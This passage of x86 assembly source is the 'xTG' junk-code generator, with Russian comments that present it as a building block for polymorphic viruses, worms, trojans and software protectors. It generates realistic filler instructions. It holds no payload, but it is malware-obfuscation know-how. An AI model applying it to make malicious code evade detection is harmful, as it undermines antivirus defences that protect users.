;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;																										 ;
;                                                            											 ;
;																										 ;
;                                       																 ;
;                                     xxxxxxxxxxxxxxxxxxxxxxxxxx      xxxxxxxxxxxxxxxxxxx				 ;
;                                     xxxxxxxxxxxxxxxxxxxxxxxxxx     xxxxxxxxxxxxxxxxxxxx     			 ;
;                                     xxxxxxxxxxxxxxxxxxxxxxxxxx    xxxxxxxxxxxxxxxxxxxxx      			 ;
;        x                         x  xxxxxxxxxxxxxxxxxxxxxxxxxx   xxxxxxxxxxxxxxxxxxxxxx				 ;
;        xxx                     xxx           xxxxxxxx           xxxxxxx		  xxxxxxx      			 ; 
;        xxxxx                 xxxxx           xxxxxxxx           xxxxxxx								 ;
;        xxxxxxx             xxxxxxx           xxxxxxxx           xxxxxxx								 ;
;        xxxxxxxxx         xxxxxxxxx           xxxxxxxx           xxxxxxx								 ;
;         xxxxxxxxxx     xxxxxxxxxx            xxxxxxxx           xxxxxxx								 ;
;           xxxxxxxxxx xxxxxxxxxx              xxxxxxxx           xxxxxxx								 ;
;             xxxxxxxxxxxxxxxxx                xxxxxxxx           xxxxxxx								 ;
;               xxxxxxxxxxxxx                  xxxxxxxx           xxxxxxx       xxxxxxxxx				 ;
;                xxxxxxxxxxx                   xxxxxxxx           xxxxxxx       xxxxxxxxx				 ;
;              xx  xxxxxxx  xx                 xxxxxxxx           xxxxxxx       xxxxxxxxx				 ;
;             xxxx  xxxxx  xxxx                xxxxxxxx           xxxxxxx         xxxxxxx				 ;
;            xxxxxx   x   xxxxxx               xxxxxxxx           xxxxxxx         xxxxxxx				 ;
;           xxxxxxxx     xxxxxxxx              xxxxxxxx            xxxxxxxxxxxxxxxxxxxxxx 				 ;
;          xxxxxxxx       xxxxxxxx             xxxxxxxx             xxxxxxxxxxxxxxxxxxxxx 				 ;
;         xxxxxxxx         xxxxxxxx            xxxxxxxx              xxxxxxxxxxxxxxxxxxxx 				 ;
;        xxxxxxxx           xxxxxxxx           xxxxxxxx               xxxxxxxxxxxxxxxxxxx				 ;
;																										 ;
;																										 ;
;																										 ;
;																										 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;							eXperimental/eXtended/eXecutable Trash Generator							 ;
;												  xTG													 ;
;												xtg.asm													 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;												  =)!													 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;												xTG														 ;
;			ЭКСПЕРИМЕНТАЛЬНЫЙ/РАСШИРЕННЫЙ/ИСПОЛНИМЫЙ ГЕНЕРАТОР МУСОРНЫХ ИНСТРУКЦИЙ/ДАННЫХ				 ; 
;																										 ;
;ВХОД (stdcall: DWORD xTG(DWORD xparam)):																 ;
;	xparam				-	адрес структуры XTG_TRASH_GEN 												 ;
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;	(+)					-	сгенерированные мусорные команды/данные										 ;
;	(+)					-	заполненные выходные поля структуры XTG_TRASH_GEN							 ;
;	EAX					-	адрес для дальнейшей записи кода											 ;
;--------------------------------------------------------------------------------------------------------;
;ЗАМЕТКИ:																								 ;
;	(+)					-	входные поля структуры XTG_TRASH_GEN (и других структур) после отработки 	 ;
;							движка остаются теми же, что и перед вызовом - не портятся; 				 ; 
;	(+)					-	если структуры будут изменяться, то делать их размер кратный 4;				 ;
;	(+)					-	данный двиг нужен для генерации мусорных инструкций. Может применяться как	 ;
;							самостоятельный движок, так и, например, вместе с полиморфом, пермутантом 	 ;
;							для построения различного кода (хаоса, реалистичного и т.д., вирусы/черви/	 ;
;							трояны), программ (навесные заshit'ы) etc; 									 ;
;	(+)					-	двиг состоит из 3 файлов: xtg.inc & xtg.asm & logic.asm. Первый файл - 		 ;
;							заголовочник. В нём найдёшь все необходимые структуры etc, и их краткие 	 ;
;							описания. 2 & 3 файлы - сама реализация движка xTG и его логики. 			 ;
;							Далее по коментам будет детальная описуха всех полей всех нужных структур	 ; 
;	(+)					-	в коментах есть суть, неточности можете кому-нить подарить;					 ;
;	(+)					-	может что-то ещё xD;														 ; 
;--------------------------------------------------------------------------------------------------------; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;v2.0.0

	

																		;m1x
																		;pr0mix@mail.ru
																		;EOF 

 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa xTG
;это и есть наш двигл (внешняя функа);
;ВХОД (stdcall xTG(DWORD xparam)):
;	xparam					-	адрес структуры XTG_TRASH_GEN
;ВЫХОД:
;	(+)						-	сгенерированный трэш;
;	(+)						-	заполненные выходные поля структуры XTG_TRASH_GEN
;	EAX						-	адрес для дальнейшей записи кода; 
;	(!) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

xtg_struct1_addr		equ		dword ptr [ebp + 24h]					;адрес структуры XTG_TRASH_GEN; 

xtg_allocated_addr		equ		dword ptr [ebp - 04]					;выделенная память с помощью alloc_addr
xtg_struct2_addr		equ		dword ptr [ebp - 08]					;адрес структуры XTG_EXT...; 
																		;далее идут различные вспомогательные переменные (но они с фичей, некоторые должны иметь опрдел. значение, для каких-либо функций, например, xtg_tmp_var1 etc); 
xtg_tmp_var1			equ		dword ptr [ebp - 12]
xtg_tmp_var2			equ		dword ptr [ebp - 16]
xtg_tmp_var3			equ		dword ptr [ebp - 20]
xtg_tmp_var4			equ		dword ptr [ebp - 24]
xtg_tmp_var5			equ		dword ptr [ebp - 28]
xtg_tmp_var6			equ		dword ptr [ebp - 32]					;

xTG:
	pushad																;сохраняем в стеке все РОН; 
	cld																	;сбрасываем флаг направления (для винапишек); 
	mov		ebp, esp
	sub		esp, 36														;выделяем место в стеке под локальные-переменные; 
	mov		xtg_tmp_var6, esp 											;сохраним текущее значение есп;
	xor		eax, eax 
	mov		ebx, xtg_struct1_addr 
	assume	ebx: ptr XTG_TRASH_GEN										;ebx - address of XTG_TRASH_GEN 
	and		[ebx].nobw, 0												;обнуляем данное поле (оно выходное); 
	cmp		[ebx].alloc_addr, 0											;теперь определим, какую память щас будем юзать: из стека или выделим с помощью соотв-х фунок; 
	je		_aafs_														;если адрес функи выделения и/или освобождения памяти равен 0, тогда выделим память в стеке; 
	cmp		[ebx].free_addr, 0
	jne		_aaua_														
_aafs_:																	;allocate address from stack
	sub		esp, (sizeof (XTG_EXT_TRASH_GEN))							;выделяем место в стеке для структуры XTG_EXT_TRASH_GEN
	jmp		_stat_minsize_tbl_ 

_aaua_:																	;allocate address by using alloc_addr 
	push	(NUM_INSTR * 4 + sizeof(XTG_EXT_TRASH_GEN) + size_of_stack_commit + 04)
	call	[ebx].alloc_addr 											;выделяем память под стату опкодов + структуру XTG_EXT_TRASH_GEN + свой новый стэк; 

	test	eax, eax													;если не получилось выделить адрес, тогда выделим память из стэка; 
	je		_aafs_
	
	lea		esp, dword ptr [eax + (NUM_INSTR * 04) + size_of_stack_commit]						
																		;esp = адресу в выделенном участке памяти, с которого (в сторону больших адресов) будет лежать структура XTG_EXT_TRASH_GEN, 
																		;и с которого (в сторону меньших адресов - ака стек) будем сохранять табличку размеров команд и стату частоты опкодов; 
_stat_minsize_tbl_:
	mov		xtg_allocated_addr, eax										;сохраним дополнительно этот адрес в локальной переменной; 
	mov		ecx, esp													;ecx - сожержит адрес, по которому будет размещена структура XTG_EXT_TRASH_GEN; 
																		;то есть таблица размеров команд и статы их опкодов, а также структура XTG_EXT_TRASH_GEN будет находится либо в стеке, либо в выделенной памяти; 
	
;---------------[TABLE OF (MAX) SIZE OF INSTR & OPCODE FREQUENCY STATISTICS (BEGIN)]---------------------
																		;В общем тема такая: если нужно добавить какую-то свою конструкцию, тогда: 
																		;1) создаем её (в xtg.asm)
																		;2) увеличиваем на +1 NUM_INSTR (xtg.inc)
																		;3) далее в эту таблицу записываем свои данные по новой конструкции (первый push - это последняя конструкция, в коментах они пронумерованы); например, если добавляем свой push в начало, тогда в таблице переходов - добавляем свой переход в самый конец; 
																		;4) после добавляем в "табличку переходов" переход на свою конструкцию; 
																		;статистику встречаемости опкодов можно при желании скорректировать по другому. И стату внутри каждой группы конструкций также =)
																		;младшие 2 байта - это стата, старшие 2 байта - это max размер конструкции; 
;----------------------------------------[XMASK2 BEGIN]--------------------------------------------------		
	mov		eax, WINAPI_MAX_SIZE
	shl		eax, 16
	add		eax, 090h 
	push	eax
		
	push	030D0015h													;43	42	10 
	push	03090020h													;42	41	09
	push	00070009h													;41	40	08
	push	00030002h													;40	39	07
	push	00030008h													;39 38	06
	push	00070008h													;38	37	05
	push	00030030h													;37	36	04
	push	00030060h													;36	35	03
	push	03100011h													;35	34	02
	push	030C0010h													;34	33	01
	push	000A000Ah													;33	32	00
;-----------------------------------------[XMASK2 END]---------------------------------------------------
;----------------------------------------[XMASK1 BEGIN]--------------------------------------------------
	push	00060001h													;32	31
	push	00060002h													;31	30
	push	00060008h													;30	29
	push	00060003h													;29	28
	push	00060005h													;28	27
	push	000A000Eh													;27	26
	push	00060060h													;26	25
	push	00030000h													;25	24
	push	00020000h													;24	23
	push	00030000h													;23	22
	push	060B0020h													;22	21
	push	0364001Ah													;21	20
	push	03060001h													;20	19
	push	00810003h													;19	18
	push	03080025h													;18	17
	push	030C0009h													;17	16
	push	03090010h													;16	15
	push	03080010h													;15	14
	push	000D0030h													;14	13
	push	00550000h													;13	12	;если режим XTG_REALISTIC и в стате стоят 0, тогда эта команда не будет генериться; 
	push	00030006h													;12	11
	push	00030002h													;11	10
	push	00030015h													;10	09
	push	00060003h													;09	08
	push	00020004h													;08	07
	push	00030016h													;07	06
	push	00060016h													;06	05
	push	0005000Bh													;05	04
	push	00020004h													;04	03
	push	00020040h													;03	02
	push	00020003h													;02	01
	push	00010010h													;01	00 
;-----------------------------------------[XMASK1 END]---------------------------------------------------	 
;---------------[TABLE OF (MAX) SIZE OF INSTR & OPCODE FREQUENCY STATISTICS (END)]----------------------- 
	mov		xtg_struct2_addr, ecx										;
	assume	ecx: ptr XTG_EXT_TRASH_GEN
	mov		[ecx].ofs_addr, esp											;сохраняем в данном поле адрес таблицы размеров команд и статистики их опкодов; 
	mov		[ecx].one_byte_opcode_addr, 0								;пока что обнулим данное поле;
	mov		edi, [ebx].xfunc_struct_addr								;сохраним в стеке данное поле - оно может измениться; 
	
_xtg_data_gen_:															;генератор(ция) трэш-данных: строк/чисел; 
	push	[ebx].xdata_struct_addr	
	push	ebx
	call	xtg_data_gen

_xtg_let_:
	push	ebx															;XTG_TRASH_GEN   
	call	let_init													;вызываем функу инициализации "логики" трэш-кода; 

	mov		[ecx].xlogic_struct_addr, eax								;либо 0 либо адрес выделенной памяти (ака также XTG_LOGIC_STRUCT) (смотри в сорцы!) 
	
	call	gen_data_for_func 											;вызываем функу генерации структур (данных) для будущих функций - но перед этим функа проверит, указано ли, чтобы мы генерили функи или нет? 

	test	eax, eax													;если по какой-то причине (смотри в функу) мы не генерируем функу, тогда отправляемся просто на генерацию команд; 
	je		_xtg_gen_trash_ 

_xtg_realistic_plus_func_:
	push	ecx
	push	ebx
	call	gen_func													;иначе вызовем функу генераци функций с прологами, трэшем, эпилогами etc; 

	push	xtg_tmp_var1												;в xtg_tmp_var1 - у нас будет валяться адрес выделенной памяти, так вот освободим её; 
	call	[ebx].free_addr
 
	jmp		_xtg_nxt_1_ 												;прыгаем дальше; 

_xtg_gen_trash_:	
	push	ecx
	push	ebx
	call	xtg_main													;тут вызываем саму функу генерации трэша; 

_xtg_nxt_0_:	
	mov		eax, [ebx].tw_trash_addr									;eax - входной адрес, куда надо было записать мусор
	mov		[ebx].ep_trash_addr, eax									;это же и точка входа в созданный мусор;
	add		eax, [ebx].nobw												;в nobw - кол-во реально сгенерированного мусора
	mov		[ebx].fnw_addr, eax 										;а это поле теперь содержит адрес для дальнейшей записи кода; 
_xtg_nxt_1_: 
	mov		esp, xtg_tmp_var6											;восстановим есп; 
	cmp		[ecx].xlogic_struct_addr, 0
	je		_xtg_nxt_2_

	push	[ecx].xlogic_struct_addr
	call	[ebx].free_addr

_xtg_nxt_2_:
	cmp		xtg_allocated_addr, 0										;если это поле != 0, тогда ранее была выделена память, сейчас освободим её; 
	je		_xtg_final_
	
	push	xtg_allocated_addr
	call	[ebx].free_addr
		
_xtg_final_:	
	mov		[ebx].xfunc_struct_addr, edi								;восстанавливаем ранее сохранённое поле структуры; 
	mov		eax, [ebx].fnw_addr 
	mov		dword ptr [ebp + 1Ch], eax 									;на выходе eax будет содержать адрес для дальнейшей записи кода; 
	mov		esp, ebp
	popad
	ret		04															;выходим!; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи xtg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa xtg_main
;основная функа генерации трэша (внутренняя); 
;ВХОД (stdcall xtg_main(DWORD param1, DWORD param2)):
;	param1				-	адрес (заполненной) структуры XTG_TRASH_GEN 
;	param2				-	адрес структуры XTG_EXT_TRASH_GEN  
;ВЫХОД:
;	XTG_TRASH_GEN.nobw 	- 	кол-во реально записанных байтов;
;	(+)					-	сгенеренный трэш; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;тут идут различные вспомогательные переменные/значения/etc; 
XM_EAX				equ		00000000b									;00h 
XM_ECX				equ		00000001b									;01h
XM_EDX				equ		00000010b									;02h
XM_EBX				equ		00000011b									;03h
XM_ESP				equ		00000100b									;04h
XM_EBP				equ		00000101b									;05h
XM_ESI				equ		00000110b									;06h
XM_EDI				equ		00000111b									;07h

xm_struct1_addr		equ		dword ptr [ebp + 24h]						;XTG_TRASH_GEN
xm_struct2_addr		equ		dword ptr [ebp + 28h]						;XTG_EXT_TRASH_GEN 

xm_minsize_instr	equ		dword ptr [ebp - 04]						;будет содержать размер самой короткой команды, доступной для генерации; 
xm_tmp_reg0			equ		dword ptr [ebp - 08]						;а тут идут различные переменные, но некоторые из них юзаются и в других вспомогательных функах (изучаем сорцы); 
xm_tmp_reg1			equ		dword ptr [ebp - 12]
xm_tmp_reg2			equ		dword ptr [ebp - 16]
xm_tmp_reg3			equ		dword ptr [ebp - 20]
xm_tmp_reg4			equ		dword ptr [ebp - 24]
xm_tmp_reg5			equ		dword ptr [ebp - 28]
xm_xids_addr		equ		dword ptr [ebp - 32]
  
xtg_main:
	pushad
	mov		ebp, esp
	sub		esp, 36
	mov		ebx, xm_struct1_addr
	assume	ebx: ptr XTG_TRASH_GEN
	mov		esi, xm_struct2_addr
	assume	esi: ptr XTG_EXT_TRASH_GEN
	mov		esi, [esi].xlogic_struct_addr
	assume	esi: ptr XTG_LOGIC_STRUCT
	test	esi, esi													;если тут 0, тогда логика вообще не будет использоваться; 
	je		_xm_nxt_0_
	mov		esi, [esi].xinstr_data_struct_addr
_xm_nxt_0_:
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	mov		xm_xids_addr, esi											;XTG_INSTR_DATA_STRUCT;
	 
	call	get_minsize_instr											;вызовем функу получения минимального размера команды, доступной сейчас для генерации; 
	
	mov		ecx, [ebx].trash_size										;ecx - содержит размер кода, который надо сгенерить; 
	mov		edi, [ebx].tw_trash_addr									;edi - адрес, куда записать трэш
	or		xm_tmp_reg0, -01											;проинициализируем данную локальную переменную = -1; 
	add		[ebx].nobw, ecx 											;это поле сейчас равно размеру трэша, который надо сгенерить; 

_chk_instr_:

	mov		edx, xm_struct2_addr										;далее, тут проверим, можно ли юзать логику и если да, то делаем это;
	assume	edx: ptr XTG_EXT_TRASH_GEN
	mov		esi, xm_xids_addr
	assume	esi: ptr XTG_INSTR_DATA_STRUCT
	test	esi, esi													;можно ли юзать логику?
	je		_xm_nxt_1_
	cmp		[esi].instr_addr, 0											;если тут 0, тогда перепрыгиваем (такое бывает, когда мы первый раз (или снова, или при генерации конструкций (рекурсия)) вызываем xtg_main для генерации трэш-кода); 
	je		_xm_nxt_1_
	cmp		edi, [esi].instr_addr										;если эти адреса совпали, то перепрыгнем (такое получается, когда мы перешли на генерацию какой-нить команды, а, для неё, например, уже не хватает байтов - тогда мы возвращаемся на выбор другой команды, а эти адреса будут равны); 
	je		_xm_nxt_1_
	sub		[esi].instr_size, ecx										;иначе, команда сгенерилась - проверим, подходит ли она нашему трэш-коду по логике; 
																		;instr_size - содержит точный размер этой команды; 
	push	[edx].xlogic_struct_addr									;XTG_LOGIC_STRUCT
	push	ebx															;XTG_TRASH_GEN
	call	let_main													;вызываем функу проверки (+ коррекции) логики трэш-кода; 

	test	eax, eax 													;если команда подходит по логике, тогда всё отлично! (eax = 1); 
	jne		_xm_nxt_1_
	cmp		[esi].norb, 06												;если же не подходит, то проверим, сколько ещё байтов осталось для генерации трэша?
	jb		_xm_l06_													;если байтов >= 6, тогда сгенеренную команду сотрём (другой новой командой); скорректируем адреса и размер, куда и сколько записывать мусора (адрес для записи трэша будет указывать снова на то место, где сейчас записана команда, которая нам не подошла, 
	mov		edi, [esi].instr_addr										;а размер снова равен значению, которое было перед генерацией этой команды); 
	mov		ecx, [esi].norb												;число 6 (байтов) - именно такое, так как если нужно проинициализировать рег или изменить его значение нa новое (которого ещё не было), то 6 байтов вполне подходит (например, команды mov reg32, imm32 и add reg32, imm32   etc); 
	jmp		_xm_nxt_1_													;в итоге команда не подошла, мы скорректировали адрес и размер для генерации трэша, и генерим новую команду; 
_xm_l06_:
	test	[esi].param_1, XTG_XIDS_CONSTR								;если < 6, тогда ещё проверим, был ли выставлен старший бит в данном поле - если нет, тогда мы генерим команды, которые не принадлежат конструкциям (push/pop etc), 
	je		_xm_nxt_1_													;и хрен с этой командой - делаем так, что она проходит проверку - это для того, чтобы наш трэшген работал корректно; 
	mov		edi, [esi].instr_addr										;если же старший бит был установлен, тогда команды являются частью конструкции и разрешать их генерацию нельзя - мы просто скорректируем адрес и размер для генерации трэша и выйдем (из рекурсии); 
	mov		ecx, [esi].norb
	jmp		_xm_final_
		
_xm_nxt_1_:
	cmp		ecx, xm_minsize_instr										;и теперь начнем генерить трэшак... если кол-во оставшихся байтов для генерации трэша меньше размера самой короткой инструкции, доступной для генерации, тогда выходим; 
	jl		_xm_final_
	
_ci_:		
	push	NUM_INSTR													;иначе случайно определим, какую команду будем генерить?; 
	call	[ebx].rang_addr
	
	call	check_instr													;проверим, есть ли варик её генерить? 
	
	inc		eax
	je		_ci_														;если нет, тогда всё херня, начнем по-новой =)! 
	dec		eax
	 
	test	esi, esi													;если логика запрещена, тогда перепрыгиваем
	je		_xm_nxt_2_
	mov		[esi].instr_addr, edi										;иначе сохраним адрес будущей новой команды
	mov		[esi].instr_size, ecx										;её размер сейчас = кол-ву оставшихся байт. Короче, пример: допустим, сейчас мы тут записали 5 (ecx = 5), затем сгенерили трёхбайтовую команду (ecx = 5 - 3 = 2), и после (см выше) мы сделаем 5 - 2 = 3 байта -> размер сгенеренной команды; 
	mov		[esi].flags, eax											;флаг - по нему мы определим, что за команду генерили;
	mov		[esi].norb, ecx												;кол-во оставшихся байт для генерации трэша (нужно для отката, если команда не подойдёт по логике); 
	
;------------------------------------[TABLE OF JMP'S (BEGIN)]--------------------------------------------
																		;etc 
;----------------------------------------[XMASK1 BEGIN]--------------------------------------------------
_xm_nxt_2_:	
	;dec		eax
	test	eax, eax														
	je		inc_dec___r32												;00 (1 byte)
	dec		eax
	je		not_neg___r32												;01 (2 bytes) 
	dec		eax
	je		mov_xchg___r32__r32											;02 (2 bytes)
	dec		eax																
	je		mov_xchg___r8__r8_imm8										;03 (2 bytes)
	dec		eax
	je		mov___r32_r16__imm32_imm16									;04 (5 bytes) 
	dec		eax
	je		lea___r32___mso												;05 (6 bytes) 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r32_r16__r32_r16				;06 (3 bytes)
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r8__r8							;07 (2 bytes) 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r32__imm32						;08 (6 bytes)
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r32__imm8						;09 (3 bytes)
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r8__imm8						;10 (3 bytes)
	dec		eax
	je		rcl_rcr_rol_ror_shl_shr___r32__imm8							;11 (3 bytes)
	dec		eax
	je		push_pop___r32___r32										;12 (2 + 53h = 55h bytes)
	dec		eax
	je		push_pop___imm8___r32										;13 (3 + 0Ah = 0Dh bytes)
	dec		eax
	je		cmp___r32__r32												;14 (2 + 6 + 300h = 308h bytes) 
	dec		eax
	je		cmp___r32__imm8												;15 (3 + 6 + 300h = 309h bytes)
	dec		eax
	je		cmp___r32__imm32											;16 (6 + 6 + 300h = 30Ch bytes)
	dec		eax
	je		test___r32_r8__r32_r8										;17 (2 + 6 + 300h = 308h bytes)  
	dec		eax
	je		jxx_short_down___rel8										;18 (2 + 7Fh = 81h bytes)
	dec		eax
	je		jxx_near_down___rel32										;19 (6 + 300h = 306h bytes) 
	dec		eax
	je		jxx_up___rel8___rel32										;20 (300h + 50h + 05 + 03 + 06 + 06 = 364h bytes) 
	dec		eax
	je		jmp_down___rel8___rel32										;21 (300h + 300h + 06 + 05 = 60Bh bytes); 
	dec		eax
	je		cmovxx___r32__r32											;22 (3 bytes); 
	dec		eax
	je		bswap___r32													;23 (2 bytes) 
	dec		eax
	je		three_bytes_instr											;24 (3 bytes); 
	dec		eax
	je		mov___r32_m32__m32_r32										;25 (6 bytes); 
	dec		eax
	je		mov___m32__imm8_imm32										;26 (0Ah bytes); 
	dec		eax
	je		mov___r8_m8__m8_r8											;27 (06 bytes); 
	dec		eax
	je		inc_dec___m32												;28 (06 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r32__m32						;29 (06 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___m32__r32						;30 (06 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r8_m8__m8_r8					;31 (06 bytes);  
;-----------------------------------------[XMASK1 END]---------------------------------------------------
;----------------------------------------[XMASK2 BEGIN]--------------------------------------------------
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___m32_m8__imm32_imm8				;32 00 (0Ah bytes); 
	dec		eax
	je		cmp___r32_m32__m32_r32										;33 01 (300h + 06 + 06 = 30Ch bytes); 
	dec		eax
	je		cmp___m32_m8__imm32_imm8									;34 02 (300h + 10 + 06 = 310h bytes); 
	dec		eax
	je		mov_lea___r32__m32ebpo8										;35 03 (03 bytes); 
	dec		eax
	je		mov___m32ebpo8__r32											;36 04 (03 bytes); 
	dec		eax
	je		mov___m32ebpo8__imm32										;37 05 (07 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___r32__m32ebpo8					;38 06 (03 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___m32ebpo8__r32					;39 07 (03 bytes); 
	dec		eax
	je		adc_add_and_or_sbb_sub_xor___m32ebpo8__imm32_imm8			;40 08 (max 07 bytes etc); 
	dec		eax
	je		cmp___r32_m32ebpo8__m32ebpo8_r32							;41 09 (300h + 03 + 06 = 309h bytes); 
	dec		eax
	je		cmp___m32ebpo8__imm32_imm8									;42 10 (300h + 07 + 06 = 30Dh bytes); 

	dec		eax
	je		xwinapi_func												;43 
;-----------------------------------------[XMASK2 END]--------------------------------------------------- 
;------------------------------------[TABLE OF JMP'S (END)]----------------------------------------------

;-------------------------------------[EXIT FROM XTG_MAIN]-----------------------------------------------
_xm_final_: 
	sub		[ebx].nobw, ecx 											;отнимаем от значения данного поля кол-во незаписанных байтов, и получаем число реально записанных байтов; 
	mov		esp, ebp
	popad
	ret		04 * 2														;выходим; 
;-------------------------------------[EXIT FROM XTG_MAIN]-----------------------------------------------




 
;=========================================[INC/DEC REG32]================================================
;INC	EAX	etc (40h)
;DEC	EAX	etc	(48h) 
inc_dec___r32:
	test	ecx, ecx													;если больше нет байт для генерации трэша, то на выход
	je		_xm_final_

	push	02															;иначе случайно выберем, какую из двух заданных инструкций будем генерить
	call	[ebx].rang_addr

	shl		eax, 03
	add		al, 40h
	xchg	eax, edx

	call	get_free_r32												;получим случайный свободный регистр

	add		eax, edx
	stosb																;запишем сгенерированный опкод
	dec		ecx															;скорректируем число оставшихся байт для генерации и записи мусора
	jmp		_chk_instr_
;=========================================[INC/DEC REG32]================================================	 



;=========================================[NOT/NEG REG32]================================================
;NOT	EAX		etc (0F7h XXh)
;NEG	EAX		etc (0F7h XXh)
;etc
not_neg___r32:
	cmp		ecx, 02														;если число оставшихся для генерации и записи трэша байт меньше 2-х, то выходим
	jl		_chk_instr_ 
	mov		al, 0F7h													;иначе сначала запишем опкод
	stosb

	push	02
	call	[ebx].rang_addr												;затем случайно выберем, какую инструкцию будем генерировать

	shl		eax, 03														;смотри, как строится данный байт (модрм)
	add		al, 0D0h
	xchg	eax, edx

	call	get_free_r32												;получаем свободный регистр

	add		eax, edx
	stosb																;etc 
	dec		ecx
	dec		ecx
	jmp		_chk_instr_
;=========================================[NOT/NEG REG32]================================================



;=====================================[MOV/XCHG REG32, REG32]============================================	 
;[MOV/XCHG REG32, REG32] ;если генерим XCHG REG32, REG32, тогда REG32 != EAX; 
;а также REG32_1 != REG32_2
;MOV	EAX, EDX	etc (8Bh)
;XCHG	ECX, EDX	etc (87h)
;XCHG	EAX, EDX	etc (9Xh)
mov_xchg___r32__r32:
																		;далее идут частоты определённых опкодов (групп опкодов иногда) 
OFS_MOV_8Bh			equ		50
OFS_XCHG_87h		equ		01
OFS_XCHG_9Xh		equ		01
																		;50 + 1 + 1 = 52 = 0x34; 
	cmp		ecx, 02														;если длина генерируемой инструкции меньше 2-х, 
	jl		_chk_instr_													;тогда попробуем сгенерить другую инструкцию
	
	push	(OFS_MOV_8Bh + OFS_XCHG_87h + OFS_XCHG_9Xh) 				;кладём сумму частот появления данных опкодов в стэк - это параметр для гсч;
	call	[ebx].rang_addr												;сгенерим СЧ;
	
	cmp		eax, OFS_XCHG_9Xh											;если СЧ меньше частоты OFS_XCHG_9Xh, тогда сгенерим данный опкод;
	jl		xchg___eax__r32
	
	push	[ebx].fregs													;save
	
	cmp		eax, (OFS_XCHG_87h + OFS_XCHG_9Xh)							;если СЧ меньше суммы частот OFS_XCHG_87h + OFS_XCHG_9Xh, то сгенерим данный опкод
	jge		_8Bh_ 														;если же больше либо равно, тогда сгенерим опкод 0x8B; 
_87h_:	
	mov		al, 87h														;[XCHG REG32, REG32] (REG32 != EAX); 
	
	mov		xm_tmp_reg0, XM_EAX											;and xm_tmp_reg0, 0; указываем, что нужно заблокировать регистр EAX, так как генерация XCHG EAX, reg32 и длиной 2 БАЙТА! - это херня;   
	call	set_r32														;лочим данный рег;
	
	jmp		_8Bh_87h_													;переходим дальше
_8Bh_:
	mov		al, 8Bh														;[MOV REG32, REG32]
_8Bh_87h_:
	stosb																;запишем опкод;

_gmm114r32_1_:
	call	modrm_mod11_for_r32											;генерим байт MODRM;
	
	mov		edx, xm_tmp_reg1											;если reg1 == reg2, тогда генерим по новой данный байт;
	cmp		edx, xm_tmp_reg2											;иначе может получиться, например, [MOV EAX, EAX] etc - а это та ещё хуита; 
	je		_gmm114r32_1_
	stosb																;запишем второй байтек;
	
	pop		[ebx].fregs													;restore 

	;call	unset_r32													;разлочим ранее заблокированный REG;  
	
	dec		ecx															;скорректируем кол-во оставшихся байт для генерации трэша; 
	dec		ecx		 
	jmp		_chk_instr_													;переходим к генерации следующей команды; 

;========================================================================================================
;[XCHG EAX, REG32] ;REG32 != EAX;
;XCHG	EAX, EDX	etc (9Xh) 
xchg___eax__r32:														;на генерацию данной инструкции мы можем попасть только из блока mov_xchg___r32__r32 
	test	ecx, ecx
	je		_xm_final_
	
	mov		xm_tmp_reg0, XM_EAX											;указываем, что нужно проверить, свободен ли регистр EAX
	call	is_free_r32													;вызываем функу провеки;
	
	inc		eax
	je		_chk_instr_
	dec		eax															;убрать? =)

_gfr32_for_9Xh_:	
	call	get_free_r32												;получаем случайный свободный регистр
	
	test	al, al														;если это EAX, то пробуем снова, так как нас не устраивает генерация [XCHG EAX, EAX]; 
